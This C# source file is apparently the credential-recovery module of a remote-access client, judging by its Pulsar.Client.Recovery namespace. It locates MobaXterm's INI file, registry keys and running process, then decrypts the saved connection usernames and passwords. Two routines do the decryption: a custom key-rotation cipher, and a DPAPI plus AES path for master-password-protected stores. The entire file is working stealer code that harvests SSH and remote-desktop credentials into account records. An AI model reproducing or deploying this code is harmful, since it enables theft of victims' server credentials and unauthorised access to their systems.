using Pulsar.Common.Models;
using Microsoft.Win32;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Pulsar.Client.Recovery
{
    internal static class MobaXtermReader
    {
        // DPAPI data format fixed prefix byte array
        private static readonly byte[] DpapiHeader =
        {
            0x01, 0x00, 0x00, 0x00, 0xd0, 0x8c, 0x9d, 0xdf, 0x01, 0x15,
            0xd1, 0x11, 0x8c, 0x7a, 0x00, 0xc0, 0x4f, 0xc2, 0x97, 0xeb
        };

        private const string ApplicationName = "MobaXterm";
        private const string RegistryBasePath = @"Software\Mobatek\MobaXterm";
        private const string CredentialsRegistryPath = @"Software\Mobatek\MobaXterm\C";
        private const string PasswordsRegistryPath = @"Software\Mobatek\MobaXterm\P";

        /// <summary>
        /// Reads MobaXterm passwords and credentials
        /// </summary>
        /// <returns>List of recovered accounts</returns>
        public static List<RecoveredAccount> Read()
        {
            try
            {
                // --- HARD EXISTENCE CHECK ---
                bool iniExists =
                    File.Exists(Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                        @"MobaXterm\MobaXterm.ini"))
                    ||
                    Directory.Exists(Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        @"Mobatek\MobaXterm"));

                bool registryExists =
                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Mobatek\MobaXterm") != null;

                if (!iniExists && !registryExists)
                {
                    // MobaXterm is not installed – STOP immediately
                    return new List<RecoveredAccount>();
                }
                // ---------------------------------------

                var mobaData = InitializeMobaXterm();
                if (mobaData == null)
                    return new List<RecoveredAccount>();

                return File.Exists(mobaData.IniPath)
                    ? ReadFromIniFile(mobaData)
                    : ReadFromRegistry(mobaData);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"MobaXterm initialization error: {ex.Message}");
                return new List<RecoveredAccount>();
            }
        }

        private static List<RecoveredAccount> ReadFromIniFile(MobaXtermData mobaData)
        {
            var accounts = new ConcurrentBag<RecoveredAccount>();

            try
            {
                var iniData = ParseIniFile(mobaData.IniPath);
                var tasks = new List<Task>();

                // Process credentials section in parallel
                if (iniData.ContainsKey("Credentials"))
                {
                    var credentials = iniData["Credentials"];
                    tasks.Add(Task.Run(() => ProcessCredentials(credentials, mobaData, accounts)));
                }

                // Process passwords section in parallel
                if (iniData.ContainsKey("Passwords"))
                {
                    var passwords = iniData["Passwords"];
                    tasks.Add(Task.Run(() => ProcessPasswords(passwords, mobaData, accounts)));
                }

                Task.WaitAll(tasks.ToArray());
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"MobaXterm INI file error: {ex.Message}");
            }

            return accounts.ToList();
        }

        private static void ProcessCredentials(
            Dictionary<string, string> credentials,
            MobaXtermData mobaData,
            ConcurrentBag<RecoveredAccount> accounts)
        {
            Parallel.ForEach(credentials, credential =>
            {
                try
                {
                    var parts = credential.Value.Split(new[] { ':' }, 2);
                    if (parts.Length == 2)
                    {
                        string password = DecryptPassword(parts[1], mobaData);

                        accounts.Add(new RecoveredAccount
                        {
                            Application = ApplicationName,
                            Username = parts[0],
                            Password = password,
                            Url = $"{ApplicationName}: {credential.Key}"
                        });
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"MobaXterm credential error ({credential.Key}): {ex.Message}");
                }
            });
        }

        private static void ProcessPasswords(
            Dictionary<string, string> passwords,
            MobaXtermData mobaData,
            ConcurrentBag<RecoveredAccount> accounts)
        {
            Parallel.ForEach(passwords, passwordEntry =>
            {
                try
                {
                    string password = DecryptPassword(passwordEntry.Value, mobaData);

                    accounts.Add(new RecoveredAccount
                    {
                        Application = ApplicationName,
                        Username = passwordEntry.Key,
                        Password = password,
                        Url = $"{ApplicationName} Connection"
                    });
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"MobaXterm password error ({passwordEntry.Key}): {ex.Message}");
                }
            });
        }

        private static Dictionary<string, Dictionary<string, string>> ParseIniFile(string filePath)
        {
            var result = new Dictionary<string, Dictionary<string, string>>(StringComparer.OrdinalIgnoreCase);
            string currentSection = "";

            foreach (string line in File.ReadAllLines(filePath))
            {
                string trimmedLine = line.Trim();

                // Skip empty lines and comments
                if (string.IsNullOrEmpty(trimmedLine) || trimmedLine.StartsWith(";") || trimmedLine.StartsWith("#"))
                    continue;

                // Section header
                if (trimmedLine.StartsWith("[") && trimmedLine.EndsWith("]"))
                {
                    currentSection = trimmedLine.Substring(1, trimmedLine.Length - 2);
                    if (!result.ContainsKey(currentSection))
                    {
                        result[currentSection] = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                    }
                    continue;
                }

                // Key-value pair
                int equalsIndex = trimmedLine.IndexOf('=');
                if (equalsIndex > 0 && !string.IsNullOrEmpty(currentSection) &&
                    result.ContainsKey(currentSection))
                {
                    string key = trimmedLine.Substring(0, equalsIndex).Trim();
                    string value = trimmedLine.Substring(equalsIndex + 1).Trim();
                    result[currentSection][key] = value;
                }
            }

            return result;
        }

        private static List<RecoveredAccount> ReadFromRegistry(MobaXtermData mobaData)
        {
            var accounts = new ConcurrentBag<RecoveredAccount>();
            var tasks = new List<Task>();

            // Process credentials and passwords in parallel
            tasks.Add(Task.Run(() => ProcessRegistryCredentials(mobaData, accounts)));
            tasks.Add(Task.Run(() => ProcessRegistryPasswords(mobaData, accounts)));

            Task.WaitAll(tasks.ToArray());
            return accounts.ToList();
        }

        private static void ProcessRegistryCredentials(MobaXtermData mobaData, ConcurrentBag<RecoveredAccount> accounts)
        {
            try
            {
                using (var credKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(CredentialsRegistryPath))
                {
                    if (credKey == null) return;

                    var valueNames = credKey.GetValueNames();
                    Parallel.ForEach(valueNames, valueName =>
                    {
                        try
                        {
                            string value = credKey.GetValue(valueName)?.ToString();
                            if (!string.IsNullOrEmpty(value))
                            {
                                var parts = value.Split(new[] { ':' }, 2);
                                if (parts.Length == 2)
                                {
                                    string password = DecryptPassword(parts[1], mobaData);

                                    accounts.Add(new RecoveredAccount
                                    {
                                        Application = ApplicationName,
                                        Username = parts[0],
                                        Password = password,
                                        Url = $"{ApplicationName}: {valueName}"
                                    });
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"MobaXterm registry credential error ({valueName}): {ex.Message}");
                        }
                    });
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"MobaXterm registry credentials error: {ex.Message}");
            }
        }

        private static void ProcessRegistryPasswords(MobaXtermData mobaData, ConcurrentBag<RecoveredAccount> accounts)
        {
            try
            {
                using (var pwdKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(PasswordsRegistryPath))
                {
                    if (pwdKey == null) return;

                    var valueNames = pwdKey.GetValueNames();
                    Parallel.ForEach(valueNames, valueName =>
                    {
                        try
                        {
                            string ciphertext = pwdKey.GetValue(valueName)?.ToString();
                            if (!string.IsNullOrEmpty(ciphertext))
                            {
                                string password = DecryptPassword(ciphertext, mobaData);

                                accounts.Add(new RecoveredAccount
                                {
                                    Application = ApplicationName,
                                    Username = valueName,
                                    Password = password,
                                    Url = $"{ApplicationName} Connection"
                                });
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"MobaXterm registry password error ({valueName}): {ex.Message}");
                        }
                    });
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"MobaXterm registry passwords error: {ex.Message}");
            }
        }

        private static string DecryptPassword(string ciphertext, MobaXtermData mobaData)
        {
            if (string.IsNullOrEmpty(ciphertext))
                return string.Empty;

            try
            {
                return string.IsNullOrEmpty(mobaData.MasterPassword)
                    ? DecryptWithoutMasterPassword(ciphertext, mobaData.SessionP)
                    : DecryptWithMasterPassword(ciphertext, mobaData);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"MobaXterm decryption error: {ex.Message}");
                return "[Decryption Failed]";
            }
        }

        private static string DecryptWithoutMasterPassword(string ciphertext, string sessionP)
        {
            if (string.IsNullOrEmpty(sessionP))
                return "[No SessionP]";

            // Extend sessionP to at least 20 characters
            StringBuilder sessionPBuilder = new StringBuilder(sessionP);
            while (sessionPBuilder.Length < 20)
            {
                sessionPBuilder.Append(sessionPBuilder.ToString());
            }
            string extendedSessionP = sessionPBuilder.ToString().Substring(0, 20);

            // Create key space array with both upper and lower cases
            string[] keySpace = { extendedSessionP.ToUpper(), extendedSessionP.ToLower() };
            byte[] key = Encoding.UTF8.GetBytes("0d5e9n1348/U2+67");
            const string validCharacters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/";

            // Optimize key generation
            for (int i = 0; i < key.Length; i++)
            {
                char potentialKeyChar = keySpace[(i + 1) % keySpace.Length][i % 20];
                if (validCharacters.IndexOf(potentialKeyChar) >= 0)
                {
                    key[i] = (byte)potentialKeyChar;
                }
            }

            var keySet = new HashSet<byte>(key);
            var filteredText = new List<byte>(ciphertext.Length);

            // Filter ciphertext bytes
            foreach (byte b in Encoding.ASCII.GetBytes(ciphertext))
            {
                if (keySet.Contains(b))
                {
                    filteredText.Add(b);
                }
            }

            byte[] ct = filteredText.ToArray();
            if (ct.Length % 2 != 0) return string.Empty;

            var ptArray = new List<byte>(ct.Length / 2);
            byte[] currentKey = key;

            for (int i = 0; i < ct.Length; i += 2)
            {
                int l = Array.IndexOf(currentKey, ct[i]);
                currentKey = RotateRightBytes(currentKey);
                int h = Array.IndexOf(currentKey, ct[i + 1]);
                currentKey = RotateRightBytes(currentKey);
                ptArray.Add((byte)(16 * h + l));
            }

            string result = Encoding.UTF8.GetString(ptArray.ToArray());
            return result.TrimEnd('\0');
        }

        private static byte[] RotateRightBytes(byte[] input)
        {
            byte[] rotatedBytes = new byte[input.Length];
            Array.Copy(input, 0, rotatedBytes, 1, input.Length - 1);
            rotatedBytes[0] = input[input.Length - 1];
            return rotatedBytes;
        }

        private static string DecryptWithMasterPassword(string ciphertext, MobaXtermData mobaData)
        {
            try
            {
                byte[] masterPasswordBytes = Convert.FromBase64String(mobaData.MasterPassword);
                byte[] fullEncryptedData = new byte[DpapiHeader.Length + masterPasswordBytes.Length];

                Buffer.BlockCopy(DpapiHeader, 0, fullEncryptedData, 0, DpapiHeader.Length);
                Buffer.BlockCopy(masterPasswordBytes, 0, fullEncryptedData, DpapiHeader.Length, masterPasswordBytes.Length);

                byte[] temp = ProtectedData.Unprotect(
                    fullEncryptedData,
                    Encoding.UTF8.GetBytes(mobaData.SessionP),
                    DataProtectionScope.CurrentUser
                );

                string temp2 = Encoding.UTF8.GetString(temp);
                byte[] output = Convert.FromBase64String(temp2);

                // Extract AES key (32 bytes)
                byte[] aeskey = new byte[32];
                Array.Copy(output, aeskey, 32);

                // Generate initial vector
                byte[] ivbytes = AESEncrypt(new byte[16], aeskey);
                byte[] iv = new byte[16];
                Array.Copy(ivbytes, iv, 16);

                // AES decrypt to get plaintext password
                byte[] cipherBytes = Convert.FromBase64String(ciphertext);
                string plaintext = AESDecrypt(cipherBytes, aeskey, iv);
                return plaintext.TrimEnd('\0');
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Master password decryption failed: {ex.Message}");
                return "[Master Password Decryption Failed]";
            }
        }

        private static byte[] AESEncrypt(byte[] plainBytes, byte[] bKey)
        {
            using (MemoryStream mStream = new MemoryStream())
            using (RijndaelManaged aes = new RijndaelManaged())
            {
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = bKey;

                using (CryptoStream cryptoStream = new CryptoStream(mStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cryptoStream.Write(plainBytes, 0, plainBytes.Length);
                    cryptoStream.FlushFinalBlock();
                }

                return mStream.ToArray();
            }
        }

        private static string AESDecrypt(byte[] encryptedBytes, byte[] bKey, byte[] iv)
        {
            using (MemoryStream mStream = new MemoryStream(encryptedBytes))
            using (RijndaelManaged aes = new RijndaelManaged())
            {
                aes.Mode = CipherMode.CFB;
                aes.FeedbackSize = 8;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = bKey;
                aes.IV = iv;

                using (CryptoStream cryptoStream = new CryptoStream(mStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
                using (StreamReader reader = new StreamReader(cryptoStream))
                {
                    return reader.ReadToEnd();
                }
            }
        }

        private static MobaXtermData InitializeMobaXterm()
        {
            var data = new MobaXtermData
            {
                UserPrincipalName = $"{Environment.UserName}@{Environment.MachineName}"
            };

            // Find MobaXterm process and INI file
            data.IniPath = FindMobaXtermIniPath();

            // Get SessionP from registry
            try
            {
                data.SessionP = Microsoft.Win32.Registry.GetValue($@"HKEY_CURRENT_USER\{RegistryBasePath}", "SessionP", "") as string ?? "";
            }
            catch
            {
                data.SessionP = "";
            }

            // Check for INI file in Documents folder if no SessionP found
            if (string.IsNullOrEmpty(data.SessionP))
            {
                string documentsIniPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                    @"MobaXterm\MobaXterm.ini");

                if (File.Exists(documentsIniPath))
                {
                    data.IniPath = documentsIniPath;
                }
            }

            // Get Master Password from registry if SessionP is available
            if (!string.IsNullOrEmpty(data.SessionP))
            {
                try
                {
                    data.MasterPassword = Microsoft.Win32.Registry.GetValue(
                        $@"HKEY_CURRENT_USER\{RegistryBasePath}\M",
                        data.UserPrincipalName,
                        "") as string ?? "";
                }
                catch
                {
                    data.MasterPassword = "";
                }
            }

            return string.IsNullOrEmpty(data.SessionP) && string.IsNullOrEmpty(data.IniPath)
                ? null
                : data;
        }

        private static string FindMobaXtermIniPath()
        {
            foreach (var process in System.Diagnostics.Process.GetProcesses())
            {
                try
                {
                    if (process.MainModule != null &&
                        process.MainModule.FileVersionInfo != null &&
                        process.MainModule.FileVersionInfo.FileDescription == "MobaXterm")
                    {
                        return Path.Combine(Path.GetDirectoryName(process.MainModule.FileName), "MobaXterm.ini");
                    }
                }
                catch
                {
                    // Ignore processes we can't access
                }
            }
            return null;
        }

        private class MobaXtermData
        {
            public string IniPath { get; set; }
            public string SessionP { get; set; }
            public string MasterPassword { get; set; }
            public string UserPrincipalName { get; set; }
        }
    }
}